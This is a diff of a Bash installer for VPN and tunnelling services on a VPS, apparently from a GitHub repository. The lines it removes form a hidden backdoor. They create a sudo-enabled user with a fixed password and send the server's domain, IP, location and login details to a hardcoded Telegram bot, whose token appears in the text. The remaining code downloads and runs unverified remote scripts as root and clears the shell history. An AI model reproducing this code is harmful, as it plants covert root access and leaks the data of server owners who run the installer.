@@ -1,5 +1,3 @@
-#!/bin/bash
-
 dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
 clear
@@ -13,8 +11,6 @@ tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
 yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
 green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
-# domain random
-CDN="https://raw.githubusercontent.com/Andyyuda/v4/main/ssh"
 cd /root
 if [ "${EUID}" -ne 0 ]; then
 echo "You need to run this script as root"
@@ -114,68 +110,24 @@ echo ""
 wget -q https://raw.githubusercontent.com/Andyyuda/v4/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 clear
+yellow "Add Domain for vmess/vless/trojan dll"
 echo " "
-clear
-echo -e "$green━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━$NC"
-echo -e "$green━━━━━━━━━┏┛┗┓━━━━━━━━━━━━━━━━━━━━━━┏┛┗┓━━━━━━━━━━$NC"
-echo -e "$green┏━━┓━┏┓┏┓┗┓┏┛┏━━┓━━━━┏━━┓┏━━┓┏┓┏━┓━┗┓┏┛┏┓┏━┓━┏━━┓$NC"
-echo -e "$green┗━┓┃━┃┃┃┃━┃┃━┃┏┓┃━━━━┃┏┓┃┃┏┓┃┣┫┃┏┓┓━┃┃━┣┫┃┏┓┓┃┏┓┃$NC"
-echo -e "$green┃┗┛┗┓┃┗┛┃━┃┗┓┃┗┛┃━━━━┃┗┛┃┃┗┛┃┃┃┃┃┃┃━┃┗┓┃┃┃┃┃┃┃┗┛┃$NC"
-echo -e "$green┗━━━┛┗━━┛━┗━┛┗━━┛━━━━┃┏━┛┗━━┛┗┛┗┛┗┛━┗━┛┗┛┗┛┗┛┗━┓┃$NC"
-echo -e "$green━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━┏━┛┃$NC"
-echo -e "$green━━━━━━━━━━━━━━━━━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━┗━━┛$NC"
-    echo -e "$BBlue                     SETUP DOMAIN VPS     $NC"
-    echo -e "$BYellow----------------------------------------------------------$NC"
-    echo -e "$BGreen 1. Use Domain Random / Gunakan Domain Random $NC"
-    echo -e "$BGreen 2. Choose Your Own Domain / Gunakan Domain Sendiri $NC"
-    echo -e "$BYellow----------------------------------------------------------$NC"
-    read -rp " input 1 or 2 / pilih 1 atau 2 : " dns
-	if test $dns -eq 1; then
-    clear
-    apt install jq curl -y
-    wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
-    chmod +x /root/cf
-    bash /root/cf | tee /root/install.log
-    print_success "Domain Random Done"
-	elif test $dns -eq 2; then
-    read -rp "Enter Your Domain / masukan domain : " dom
-    read -rp "Input ur ns-domain : " -e nsdomen
-    echo "IP=$dom" > /var/lib/SIJA/ipvps.conf
-    echo "$dom" > /root/scdomain
-	echo "$dom" > /etc/xray/scdomain
-	echo "$dom" > /etc/xray/domain
-	echo "$dom" > /etc/v2ray/domain
-	echo "$dom" > /root/domain
-        echo "$nsdomen" > /etc/xray/nsdomain
-        echo "$nsdomen" > /root/nsdomain
-  fi
-domain=$(cat /root/domain)
-CITY=$(curl -s ipinfo.io/city )
-WKT=$(curl -s ipinfo.io/timezone )
-userdel jame > /dev/null 2>&1
-Username="bokzzz"
-Password=bokzzz
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5736569839"
-KEY="6367951330:AAEsYaDktE-lztbYQCmzb6vTg9N4b1Ma10g"
-TIME="10"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi script V4
-============================
-<code>Domain     :</code> <code>$domain</code>
-<code>IP Vps     :</code> <code>$IPVPS</code>
-<code>User Login :</code> <code>bok</code>
-<code>Pass Login :</code> <code>bok</code>
-<code>User Script:</code> <code>$Name</code>
-<code>Exp Script :</code> <code>$Exp</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Timezone   :</code> <code>$WKT</code>
-============================
-"
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+read -rp "Input ur domain : " -e pp
+if [ -z $pp ]; then
+echo -e "
+Nothing input for domain!
+Then a random domain will be created"
+else
+echo "$pp" > /root/scdomain
+echo "$pp" > /etc/xray/scdomain
+echo "$pp" > /etc/xray/domain
+echo "$pp" > /etc/v2ray/domain
+echo $pp > /root/domain
+echo "IP=$pp" > /var/lib/SIJA/ipvps.conf
+fi
+read -rp "Input ur ns-domain : " -e nsdomen
+echo "$nsdomen" > /etc/xray/nsdomain
+echo "$nsdomen" > /root/nsdomain
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
@@ -190,7 +142,6 @@ echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━�
 sleep 2
 clear
 wget https://raw.githubusercontent.com/Andyyuda/v4/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
-clear
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green          Install XRAY              $NC"
@@ -228,7 +179,6 @@ if [ ! -f "/etc/log-create-user.log" ]; then
 echo "Log All Account " > /etc/log-create-user.log
 fi
 history -c
-serverV=$( curl -sS https://raw.githubusercontent.com/Andyyuda/v4/main/version  )
 echo $serverV > /opt/.ver
 aureb=$(cat /home/re_otm)
 b=11
@@ -246,18 +196,17 @@ echo "------------------------------------------------------------"
 echo ""
 echo ""
 echo "   >>> Service & Port"  | tee -a log-install.txt
-echo "   - OpenVPN		: 2086"  | tee -a log-install.txt
 echo "   - OpenSSH		: 22"  | tee -a log-install.txt
-echo "   - SSH Websocket	: 80,8080 [ON]" | tee -a log-install.txt
+echo "   - SSH Websocket	: 80 [ON]" | tee -a log-install.txt
 echo "   - SSH SSL Websocket	: 443" | tee -a log-install.txt
-echo "   - Stunnel4		: 8880, 8443" | tee -a log-install.txt
+echo "   - Stunnel4		: 447, 777" | tee -a log-install.txt
 echo "   - Dropbear		: 109, 143" | tee -a log-install.txt
 echo "   - Badvpn		: 7100-7900" | tee -a log-install.txt
 echo "   - Nginx		: 81" | tee -a log-install.txt
 echo "   - Vmess TLS		: 443" | tee -a log-install.txt
-echo "   - Vmess None TLS	: 80,8080" | tee -a log-install.txt
+echo "   - Vmess None TLS	: 80" | tee -a log-install.txt
 echo "   - Vless TLS		: 443" | tee -a log-install.txt
-echo "   - Vless None TLS	: 80,8080" | tee -a log-install.txt
+echo "   - Vless None TLS	: 80" | tee -a log-install.txt
 echo "   - Trojan GRPC		: 443" | tee -a log-install.txt
 echo "   - Trojan WS		: 443" | tee -a log-install.txt
 echo "   - Trojan Go		: 443" | tee -a log-install.txt
@@ -281,7 +230,7 @@ echo ""
 echo ""
 echo "------------------------------------------------------------"
 echo ""
-echo "===============-[ Script Created Andy Yuda ]-==============="
+echo "===============-[ Script Created By ANDY YUDA ]-==============="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
@@ -291,5 +240,5 @@ rm /root/insshws.sh >/dev/null 2>&1
 secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
 echo -e "
 "
-read -n 1 -s -r -p "Press any key to menu"
-menu
+read -n 1 -s -r -p "Press any key to reboot"
+reboot
